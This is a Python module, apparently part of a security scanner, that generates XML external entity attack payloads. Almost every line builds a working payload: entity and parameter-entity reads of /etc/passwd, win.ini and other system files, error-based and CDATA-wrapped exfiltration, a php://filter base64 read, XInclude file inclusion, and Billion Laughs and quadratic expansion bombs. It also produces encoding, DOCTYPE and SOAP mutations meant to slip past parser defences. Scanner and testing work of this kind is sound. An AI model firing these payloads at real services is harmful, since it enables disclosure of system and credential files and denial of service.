"""xml_parser: Payload generation."""
from __future__ import annotations

import codecs
from typing import Any, Dict, List, Optional

from argus.collectors.xml_parser.models import XMLMutationStrategy, XMLTechnique


class XMLPayloadGenerator:
    """
    Generates structured XML validation probes, parameter entity tests,
    calibrated recursive expansion payloads, and 5+ bypass mutations.
    """

    SAFE_TARGET_FILES: List[Dict[str, str]] = [
        {"path": "file:///etc/hostname", "type": "unix_hostname", "name": "/etc/hostname"},
        {"path": "file:///etc/passwd", "type": "unix_passwd", "name": "/etc/passwd"},
        {"path": "file:///etc/hosts", "type": "unix_hosts", "name": "/etc/hosts"},
        {"path": "file:///proc/version", "type": "unix_version", "name": "/proc/version"},
        {"path": "file:///c:/windows/win.ini", "type": "windows_win_ini", "name": "win.ini"},
        {"path": "file:///c:/boot.ini", "type": "windows_boot_ini", "name": "boot.ini"},
    ]

    CANARY_TOKEN = "argus_canary_token_7f9a1b3c"

    def generate_baseline_payload(self) -> str:
        """Generates a clean baseline XML payload without entity declarations."""
        return '<?xml version="1.0" encoding="UTF-8"?><root><item>argus_baseline_probe</item></root>'

    def generate_entity_resolution_payloads(
        self, target_files: Optional[List[Dict[str, str]]] = None
    ) -> List[Dict[str, Any]]:
        """Generates external general entity payloads referencing safe identifiers."""
        files = target_files or self.SAFE_TARGET_FILES
        payloads: List[Dict[str, Any]] = []

        for tf in files:
            file_path = tf["path"]
            file_type = tf["type"]
            file_name = tf["name"]

            # Standard SYSTEM entity
            xml_str = (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE root [\n'
                f'  <!ENTITY xxe SYSTEM "{file_path}">\n'
                f']>\n'
                f'<root><item>&xxe;</item></root>'
            )
            payloads.append({
                "payload": xml_str,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
                "target_file": file_name,
                "file_type": file_type,
                "content_type": "application/xml",
                "template_id": f"xxe_system_{file_type}",
            })

        # Canary entity payload
        canary_xml = (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY xxe "{self.CANARY_TOKEN}">\n'
            f']>\n'
            f'<root><item>&xxe;</item></root>'
        )
        payloads.append({
            "payload": canary_xml,
            "technique": XMLTechnique.ENTITY_RESOLUTION.value,
            "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
            "target_file": "canary_token",
            "file_type": "canary",
            "content_type": "application/xml",
            "template_id": "xxe_canary_test",
        })

        return payloads

    def generate_parameter_entity_payloads(
        self, target_files: Optional[List[Dict[str, str]]] = None
    ) -> List[Dict[str, Any]]:
        """Generates parameter entity payloads for blind/error-based DTD evaluation."""
        files = target_files or self.SAFE_TARGET_FILES
        payloads: List[Dict[str, Any]] = []

        for tf in files[:2]:
            file_path = tf["path"]
            file_type = tf["type"]
            file_name = tf["name"]

            # Standard parameter entity %pe;
            pe_xml = (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE root [\n'
                f'  <!ENTITY % pe SYSTEM "{file_path}">\n'
                f'  %pe;\n'
                f']>\n'
                f'<root><item>test</item></root>'
            )
            payloads.append({
                "payload": pe_xml,
                "technique": XMLTechnique.PARAMETER_ENTITY.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
                "target_file": file_name,
                "file_type": file_type,
                "content_type": "application/xml",
                "template_id": f"xxe_param_entity_{file_type}",
            })

            # Error-based parameter entity reflection
            err_xml = (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE root [\n'
                f'  <!ENTITY % file SYSTEM "{file_path}">\n'
                f'  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">\n'
                f'  %eval;\n'
                f'  %error;\n'
                f']>\n'
                f'<root><item>test</item></root>'
            )
            payloads.append({
                "payload": err_xml,
                "technique": XMLTechnique.PARAMETER_ENTITY.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
                "target_file": file_name,
                "file_type": file_type,
                "content_type": "application/xml",
                "template_id": f"xxe_param_entity_error_{file_type}",
            })

        return payloads

    def generate_recursive_entity_payloads(self, depth: int = 4) -> List[Dict[str, Any]]:
        """
        Generates calibrated safe recursive entity expansion payloads (Billion Laughs / quadratic).
        Calibrated depth (4 levels) triggers measurable latency/limit errors defensively without hanging.
        """
        payloads: List[Dict[str, Any]] = []

        # Calibrated safe Billion Laughs (depth 4)
        laugh_token = "argus_laugh_token_0123456789"
        lines = [
            '<?xml version="1.0" encoding="UTF-8"?>',
            '<!DOCTYPE root [',
            f'  <!ENTITY lol "{laugh_token}">',
        ]
        for i in range(1, depth + 1):
            prev = "lol" if i == 1 else f"lol{i-1}"
            expansion = f"&{prev};" * 10
            lines.append(f'  <!ENTITY lol{i} "{expansion}">')
        lines.append(']>')
        lines.append(f'<root><item>&lol{depth};</item></root>')
        billion_laughs_xml = "\n".join(lines)

        payloads.append({
            "payload": billion_laughs_xml,
            "technique": XMLTechnique.RECURSIVE_ENTITY.value,
            "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
            "target_file": "recursive_expansion",
            "file_type": "recursive_expansion",
            "content_type": "application/xml",
            "template_id": "xxe_billion_laughs_calibrated",
        })

        # Quadratic expansion payload
        quad_token = "A" * 1000
        quad_xml = (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY quad "{quad_token}">\n'
            f'  <!ENTITY quad_all "&quad;&quad;&quad;&quad;&quad;&quad;&quad;&quad;&quad;&quad;">\n'
            f']>\n'
            f'<root><item>&quad_all;&quad_all;&quad_all;&quad_all;&quad_all;</item></root>'
        )
        payloads.append({
            "payload": quad_xml,
            "technique": XMLTechnique.RECURSIVE_ENTITY.value,
            "mutation_strategy": XMLMutationStrategy.DOCTYPE_SYSTEM.value,
            "target_file": "quadratic_expansion",
            "file_type": "recursive_expansion",
            "content_type": "application/xml",
            "template_id": "xxe_quadratic_expansion",
        })

        return payloads

    def generate_mutated_payloads(
        self, strategy: Optional[XMLMutationStrategy] = None
    ) -> List[Dict[str, Any]]:
        """
        Generates 5+ distinct parser configuration bypass mutations:
        1. UTF-7/UTF-16 encoding declarations & BOM bytes
        2. CDATA section parameter entity wrapping
        3. DOCTYPE variations (PUBLIC, comments, whitespace/tabs/newlines, case variations)
        4. XML namespaces and SOAP 1.1 / 1.2 envelopes
        5. XInclude directives
        6. URI Scheme variations
        """
        mutated: List[Dict[str, Any]] = []

        # Strategy 1: UTF-16LE / UTF-16BE / UTF-7 Encoding Declarations & BOM Bytes
        if strategy is None or strategy == XMLMutationStrategy.UTF16_ENCODING:
            xml_utf16_text = (
                '<?xml version="1.0" encoding="UTF-16"?>\n'
                '<!DOCTYPE root [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
                ']>\n'
                '<root><item>&xxe;</item></root>'
            )
            # UTF-16LE with BOM
            utf16le_bytes = codecs.BOM_UTF16_LE + xml_utf16_text.encode("utf-16le")
            mutated.append({
                "payload": xml_utf16_text,
                "raw_bytes": utf16le_bytes,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.UTF16_ENCODING.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml; charset=UTF-16LE",
                "template_id": "xxe_mutation_utf16le",
            })
            # UTF-16BE with BOM
            utf16be_bytes = codecs.BOM_UTF16_BE + xml_utf16_text.encode("utf-16be")
            mutated.append({
                "payload": xml_utf16_text,
                "raw_bytes": utf16be_bytes,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.UTF16_ENCODING.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml; charset=UTF-16BE",
                "template_id": "xxe_mutation_utf16be",
            })

        if strategy is None or strategy == XMLMutationStrategy.UTF7_ENCODING:
            # UTF-7 charset declaration
            utf7_xml = (
                '<?xml version="1.0" encoding="UTF-7"?>\n'
                '+ADw-!DOCTYPE root [+ADw-!ENTITY xxe SYSTEM "file:///etc/hostname"+AD4-]+AD4-\n'
                '+ADw-root+AD4-+ADw-item+AD4-&xxe;+ADw-/item+AD4-+ADw-/root+AD4-'
            )
            mutated.append({
                "payload": utf7_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.UTF7_ENCODING.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "text/xml; charset=utf-7",
                "template_id": "xxe_mutation_utf7",
            })

        # Strategy 2: CDATA Section Parameter Entity Wrapping
        if strategy is None or strategy == XMLMutationStrategy.CDATA_WRAPPING:
            cdata_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE root [\n'
                '  <!ENTITY % start "<![CDATA[">\n'
                '  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
                '  <!ENTITY % end "]]>">\n'
                '  <!ENTITY % dtd "<!ENTITY all \'%start;%file;%end;\'>">\n'
                '  %dtd;\n'
                ']>\n'
                '<root><item>&all;</item></root>'
            )
            mutated.append({
                "payload": cdata_xml,
                "technique": XMLTechnique.PARAMETER_ENTITY.value,
                "mutation_strategy": XMLMutationStrategy.CDATA_WRAPPING.value,
                "target_file": "/etc/passwd",
                "file_type": "unix_passwd",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_cdata_wrapping",
            })

        # Strategy 3: DOCTYPE Variations (PUBLIC, Comments, Whitespace/Tabs, Case Variations)
        if strategy is None or strategy == XMLMutationStrategy.DOCTYPE_VARIATIONS:
            # PUBLIC Identifier
            public_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE root PUBLIC "-//ARGUS//XXE" "file:///etc/hostname">\n'
                '<root><item>&xxe;</item></root>'
            )
            mutated.append({
                "payload": public_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_PUBLIC.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_doctype_public",
            })

            # Internal subset with comments and whitespace
            comment_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE/**/root/**/[\n'
                '\t<!ENTITY/**/xxe/**/SYSTEM/**/"file:///etc/hostname">\n'
                ']>\n'
                '<root><item>&xxe;</item></root>'
            )
            mutated.append({
                "payload": comment_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_VARIATIONS.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_doctype_comments",
            })

            # Case variation
            case_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DocType root [\n'
                '  <!Entity xxe System "file:///etc/hostname">\n'
                ']>\n'
                '<root><item>&xxe;</item></root>'
            )
            mutated.append({
                "payload": case_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.DOCTYPE_VARIATIONS.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_doctype_case",
            })

        # Strategy 4: XML Namespaces and SOAP 1.1 / 1.2 Envelopes
        if strategy is None or strategy == XMLMutationStrategy.NAMESPACE_SOAP:
            # SOAP 1.1
            soap11_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE soapenv:Envelope [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
                ']>\n'
                '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n'
                '  <soapenv:Header/>\n'
                '  <soapenv:Body>\n'
                '    <Request>\n'
                '      <item>&xxe;</item>\n'
                '    </Request>\n'
                '  </soapenv:Body>\n'
                '</soapenv:Envelope>'
            )
            mutated.append({
                "payload": soap11_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.NAMESPACE_SOAP.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "text/xml",
                "template_id": "xxe_mutation_soap11",
            })

            # SOAP 1.2
            soap12_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE env:Envelope [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
                ']>\n'
                '<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope">\n'
                '  <env:Header/>\n'
                '  <env:Body>\n'
                '    <GetData>\n'
                '      <item>&xxe;</item>\n'
                '    </GetData>\n'
                '  </env:Body>\n'
                '</env:Envelope>'
            )
            mutated.append({
                "payload": soap12_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.NAMESPACE_SOAP.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/soap+xml",
                "template_id": "xxe_mutation_soap12",
            })

            # Namespaced custom element
            ns_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE ns:root [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
                ']>\n'
                '<ns:root xmlns:ns="http://schema.example.com/ns">\n'
                '  <ns:item>&xxe;</ns:item>\n'
                '</ns:root>'
            )
            mutated.append({
                "payload": ns_xml,
                "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                "mutation_strategy": XMLMutationStrategy.NAMESPACE_SOAP.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_namespaced",
            })

        # Strategy 5: XInclude Directives
        if strategy is None or strategy == XMLMutationStrategy.XINCLUDE:
            xinclude_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<root xmlns:xi="http://www.w3.org/2001/XInclude">\n'
                '  <item>\n'
                '    <xi:include parse="text" href="file:///etc/hostname"/>\n'
                '  </item>\n'
                '</root>'
            )
            mutated.append({
                "payload": xinclude_xml,
                "technique": XMLTechnique.XINCLUDE.value,
                "mutation_strategy": XMLMutationStrategy.XINCLUDE.value,
                "target_file": "/etc/hostname",
                "file_type": "unix_hostname",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_xinclude_text",
            })

            xinclude_fallback_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<root xmlns:xi="http://www.w3.org/2001/XInclude">\n'
                '  <item>\n'
                '    <xi:include parse="text" href="file:///etc/passwd">\n'
                '      <xi:fallback>argus_fallback_token</xi:fallback>\n'
                '    </xi:include>\n'
                '  </item>\n'
                '</root>'
            )
            mutated.append({
                "payload": xinclude_fallback_xml,
                "technique": XMLTechnique.XINCLUDE.value,
                "mutation_strategy": XMLMutationStrategy.XINCLUDE.value,
                "target_file": "/etc/passwd",
                "file_type": "unix_passwd",
                "content_type": "application/xml",
                "template_id": "xxe_mutation_xinclude_fallback",
            })

        # Strategy 6: URI Schemes
        if strategy is None or strategy == XMLMutationStrategy.URI_SCHEMES:
            uri_schemes = [
                ("file://localhost/etc/hostname", "localhost_authority"),
                ("file:/etc/hostname", "single_slash"),
                ("php://filter/read=convert.base64-encode/resource=/etc/passwd", "php_filter"),
            ]
            for uri, scheme_tag in uri_schemes:
                uri_xml = (
                    f'<?xml version="1.0" encoding="UTF-8"?>\n'
                    f'<!DOCTYPE root [\n'
                    f'  <!ENTITY xxe SYSTEM "{uri}">\n'
                    f']>\n'
                    f'<root><item>&xxe;</item></root>'
                )
                mutated.append({
                    "payload": uri_xml,
                    "technique": XMLTechnique.ENTITY_RESOLUTION.value,
                    "mutation_strategy": XMLMutationStrategy.URI_SCHEMES.value,
                    "target_file": uri,
                    "file_type": "unix_passwd" if "passwd" in uri else "unix_hostname",
                    "content_type": "application/xml",
                    "template_id": f"xxe_mutation_uri_{scheme_tag}",
                })

        return mutated

    def generate_all_payloads(self) -> List[Dict[str, Any]]:
        """Generates comprehensive list of all validation probes."""
        all_probes: List[Dict[str, Any]] = []
        all_probes.extend(self.generate_entity_resolution_payloads())
        all_probes.extend(self.generate_parameter_entity_payloads())
        all_probes.extend(self.generate_recursive_entity_payloads())
        all_probes.extend(self.generate_mutated_payloads())
        return all_probes
